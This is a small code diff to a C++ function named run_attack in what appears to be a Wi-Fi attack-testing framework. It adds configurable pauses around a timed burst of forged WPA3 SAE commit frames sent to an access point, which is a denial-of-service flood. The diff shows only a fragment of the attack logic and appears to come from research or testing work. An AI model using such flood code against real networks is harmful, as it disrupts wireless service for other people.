@@ -84,6 +84,7 @@ void run_attack(RunStatus &rs) {
 	log(LogLevel::INFO, "Attack started");
 
 	size_t mac_idx = 0;
+	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
 	dos_helpers::timed_burst(
 			sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
@@ -93,6 +94,7 @@ void run_attack(RunStatus &rs) {
 				return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
 			});
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
+	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
 	ap->disconnect();
 }
 
